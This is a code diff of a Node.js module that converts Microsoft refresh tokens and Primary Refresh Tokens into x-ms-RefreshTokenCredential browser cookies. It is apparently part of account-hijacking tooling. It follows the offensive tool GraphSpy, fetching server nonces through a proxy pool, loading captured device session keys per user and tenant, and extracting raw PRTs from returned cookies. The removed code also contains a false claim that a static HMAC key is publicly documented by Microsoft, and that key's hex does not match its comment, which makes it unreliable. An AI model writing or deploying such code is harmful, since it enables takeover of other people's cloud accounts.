@@ -48,71 +48,6 @@ const TOKEN_ENDPOINTS = {
 const PRT_SCOPES = 'openid profile email offline_access https://graph.microsoft.com/.default';
 
 
-// Static HMAC key (publicly documented by Microsoft for PRT)
-const PRT_HMAC_KEY = Buffer.from("6162633263336434653566366137623863396430653166326133623463356436", 'hex'); // a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6
-
-/**
- * Base64url encode without padding (competitor-compatible)
- */
-function b64url(data) {
-  if (typeof data === 'string') data = Buffer.from(data);
-  return data.toString('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
-}
-
-/**
- * Build x-ms-RefreshTokenCredential PRT JWT
- * This is the core of Microsoft's Primary Refresh Token
- * 
- * The PRT is a signed JWT containing the refresh_token + client_id + scope + tid + uid
- * Signed with a static public HMAC key known to Microsoft
- * 
- * IMPORTANT: Header must include 'cty' claim with Microsoft's PRT content type
- * and 'kdf_ver: 2' for proper recognition by Azure AD
- */
-function buildPRTJwt(refreshToken, clientId, scopes, tid, uid, isMrrt = true, isPrimary = true, nonce = null) {
-  // Header matches working Microsoft PRT format
-  const header = JSON.stringify({
-    alg: "HS256",
-    typ: "JWT",
-    cty: "1w65Fw0+aYImhGdd+RDo8HU5em47ehmV",
-    kdf_ver: 2
-  }, '', '');
-  
-  // Generate unique nonce if not provided
-  // This ensures each PRT JWT is different even for the same refresh token
-  const requestNonce = nonce || generateUniqueNonce();
-  
-  // Payload must be minimal - only refresh_token, is_primary, and request_nonce
-  // Extra fields (client_id, scope, tid, uid, is_mrrt, ver) cause AADSTS5002726 error
-  const payload = JSON.stringify({
-    refresh_token: refreshToken,
-    is_primary: "true",
-    request_nonce: requestNonce
-  }, '', '');
-
-  const headerB64 = b64url(header);
-  const payloadB64 = b64url(payload);
-  const signingInput = Buffer.from(`${headerB64}.${payloadB64}`, 'ascii');
-
-  const hmac = require('crypto').createHmac('sha256', PRT_HMAC_KEY);
-  hmac.update(signingInput);
-  const signature = b64url(hmac.digest());
-
-  return `${headerB64}.${payloadB64}.${signature}`;
-}
-
-/**
- * Generate a unique nonce for PRT JWT
- * Uses timestamp + random bytes to ensure uniqueness
- */
-function generateUniqueNonce() {
-  const crypto = require('crypto');
-  const timestamp = Date.now().toString(36);
-  const randomBytes = crypto.randomBytes(16).toString('base64url');
-  // Format: AwABEgEAAAADAOz_BQD0_<timestamp>_<random>
-  return `AwABEgEAAAADAOz_BQD0_${timestamp}_${randomBytes}`;
-}
-
 /**
  * Decode client_info from Microsoft token response
  * client_info is base64-encoded JSON with uid (object_id) and utid (tenant_id)
@@ -201,9 +136,7 @@ function detectAccountTypeFromContext(token, email, tenant) {
  * - A simple refresh token string -> will build PRT JWT (needs tid/uid via optional params)
  * - A full token response object (from /token endpoint) -> extracts
  all fields auto */
-let legacyPrtWarned = false;
-
-function generateXmsRefreshTokenCredential(tokenResponse, accountType, extraOpts = {}) {
+async function generateXmsRefreshTokenCredential(tokenResponse, accountType, extraOpts = {}) {
   let refreshToken, tid, uid, clientId, scopes;
 
   // Handle object input (full token response from Microsoft)
@@ -271,66 +204,53 @@ function generateXmsRefreshTokenCredential(tokenResponse, accountType, extraOpts
     };
   }
 
-  // For work/school accounts, build PRT JWT
-  if (accountType === 'work_school' && refreshToken && uid && tid) {
-    // PREFERRED: GraphSpy-compatible KDF-signed cookie (kdf_ver 2). Only
-    // available when the caller supplies a real PRT session key + fresh
-    // nonce (extraOpts.sessionKey / extraOpts.nonce). Here refreshToken must
-    // be an actual PRT. The static-HMAC path below is a legacy fallback only.
-    if (extraOpts.sessionKey && extraOpts.nonce) {
+  // For work/school accounts, build the PRT JWT.
+  // NOTE: uid/tid are NOT required - GraphSpy's buildPrtCookieJwt signs with
+  // (prt, sessionKey, nonce) only. Requiring them here used to push callers
+  // onto the base64 fallback for no reason.
+  if (accountType === 'work_school') {
+    // GraphSpy's method (kdf_ver 2): a JWT signed with the key derived from
+    // the PRT session key. Requires a real PRT session key + a fresh
+    // srv_challenge nonce (extraOpts.sessionKey / extraOpts.nonce). Here
+    // refreshToken must be an actual PRT. A live nonce is fetched when
+    // extraOpts.nonce is not provided.
+    if (extraOpts.sessionKey) {
       try {
         const prtkdf = require('./prtkdf');
-        const kdfCookie = prtkdf.buildPrtCookieJwt(refreshToken, extraOpts.sessionKey, extraOpts.nonce);
-        console.log('[CookieConverter] PRT cookie generated via KDF session key (uid=' + uid.substring(0, 8) + '..., tid=' + tid + ')');
+        // GraphSpy's generate_cookie fetches a live srv_challenge nonce
+        // when the caller has none. getSrvChallengeNonce() claims a proxy
+        // from the pool and releases it again, so no manual release is
+        // needed here.
+        const nonce = extraOpts.nonce || await prtkdf.getSrvChallengeNonce();
+        // GraphSpy passes the PRT JWT as the refresh_token claim, not the raw token.
+        const prt = extraOpts.prt || refreshToken;
+        const kdfCookie = prtkdf.buildPrtCookieJwt(prt, extraOpts.sessionKey, nonce);
+        console.log('[CookieConverter] PRT cookie generated via KDF session key (uid=' + String(uid || '').substring(0, 8) + '..., tid=' + (tid || '?') + ')');
         return {
           name: 'x-ms-RefreshTokenCredential',
           value: kdfCookie,
           domain: '', // No domain - set for current page only
         };
       } catch (kdfErr) {
-        console.warn('[CookieConverter] KDF PRT cookie failed, falling back to legacy static-HMAC build:', kdfErr.message);
+        // Deliberately NO base64 fallback - see the note above the guard.
+        throw new Error('PRT cookie generation failed: ' + kdfErr.message);
       }
-    }
-    try {
-      if (!legacyPrtWarned) {
-        legacyPrtWarned = true;
-        console.warn('[CookieConverter] DEPRECATED: static-HMAC PRT JWT in use (no PRT session key available). For work/school PRTs, prefer a stored session key via prtkdf.');
-      }
-      const prtJwt = buildPRTJwt(refreshToken, clientId, scopes, tid, uid, true, true);
-      console.log('[CookieConverter] PRT JWT generated (uid=' + uid.substring(0, 8) + '..., tid=' + tid + ')');
-      return {
-        name: 'x-ms-RefreshTokenCredential',
-        value: prtJwt,
-        domain: '', // No domain - set for current page only
-      };
-    } catch (err) {
-      console.warn('[CookieConverter] PRT JWT build failed, falling back to base64:', err.message);
     }
 
-    // Fallback to base64 if PRT JWT fails
-    const credential = JSON.stringify({
-      token_type: 'Bearer',
-      refresh_token: refreshToken,
-      expires_in: 1209599
-    });
-    return {
-      name: 'x-ms-RefreshTokenCredential',
-      value: Buffer.from(credential).toString('base64'),
-      domain: '', // No domain - set for current page only
-    };
+    // The ONLY supported x-ms-RefreshTokenCredential is GraphSpy's KDF-signed
+    // JWT. Entra validates that HS256 signature, so a base64 JSON blob - what
+    // this function used to emit as a "fallback" - is rejected outright and
+    // merely hides the real failure. Return null and let the caller report it.
+    console.warn(
+      '[CookieConverter] Cannot build PRT cookie: no sessionKey supplied. ' +
+      'Capture the PRT session key first (device_credentials.session_key_encrypted).'
+    );
+    return null;
   }
 
-  // Unknown account type or missing uid/tid - default to base64
-  const credential = JSON.stringify({
-    token_type: 'Bearer',
-    refresh_token: refreshToken,
-    expires_in: 1209599
-  });
-  return {
-    name: 'x-ms-RefreshTokenCredential',
-    value: Buffer.from(credential).toString('base64'),
-    domain: '', // No domain - set for current page only
-  };
+  // Unknown account type: no PRT cookie can be produced.
+  console.warn('[CookieConverter] No PRT cookie for account type "' + accountType + '"');
+  return null;
 }
 
 /**
@@ -472,9 +392,25 @@ async function convertTokensToCookies(inputToken, templateType, tenant, email, a
       }
     }
 
-    // Fallback: generate PRT JWT from refresh token or use base64 format
+    // Build the PRT cookie with GraphSpy's KDF method. The session key is
+    // captured at device enrollment into device_credentials.session_key_encrypted;
+    // without it no valid PRT cookie exists, so look it up first.
     if (!xmsCookie) {
-      xmsCookie = generateXmsRefreshTokenCredential(exchangeResult.new_refresh_token || inputToken, accountType);
+      let sessionKey = null;
+      if (!isPersonal && userId && tenant) {
+        try {
+          const deviceManager = require('./devicemanager');
+          const stored = await deviceManager.getStoredSessionKey(userId, tenant);
+          if (stored && stored.hasSessionKey) sessionKey = stored.sessionKey;
+        } catch (skErr) {
+          console.warn('[CookieConverter] Session key lookup failed:', skErr.message);
+        }
+      }
+      xmsCookie = await generateXmsRefreshTokenCredential(
+        exchangeResult.prt || exchangeResult.new_refresh_token || inputToken,
+        accountType,
+        { prt: exchangeResult.prt, sessionKey }
+      );
     }
     console.log('[CookieConverter] XMS cookie:', xmsCookie ? 'generated' : 'null');
 
@@ -573,11 +509,28 @@ async function exchangeTokenForCookies(token, targetTenant, accountType, scope) 
         newRefreshToken = response.data.refresh_token || token;
         extractCookiesFromResponse(cookies, response, endpoint);
         console.log('[CookieConverter] Token exchange succeeded on:', endpoint, '- got', cookies.length, 'cookies');
+        // Extract the PRT. The x-ms-RefreshTokenCredential cookie value is a
+        // KDF-signed JWT whose refresh_token claim is the raw PRT — GraphSpy
+        // passes that raw PRT as the refresh_token claim, not the cookie value.
+        let prt = null;
+        const prtCookie = (cookies || []).find(c => c.name === 'x-ms-RefreshTokenCredential');
+        if (prtCookie) {
+          try {
+            const parts = String(prtCookie.value).split('.');
+            if (parts.length === 3) {
+              const payload = JSON.parse(Buffer.from(parts[1], 'base64url').toString('utf8'));
+              prt = payload.refresh_token || null;
+            }
+          } catch (e) { /* not a JWT — fall through to newRefreshToken */ }
+        }
+        if (!prt) prt = newRefreshToken;
+
         return {
           success: true,
           cookies,
           access_token: response.data.access_token,
           new_refresh_token: newRefreshToken,
+          prt,
         };
       }
 
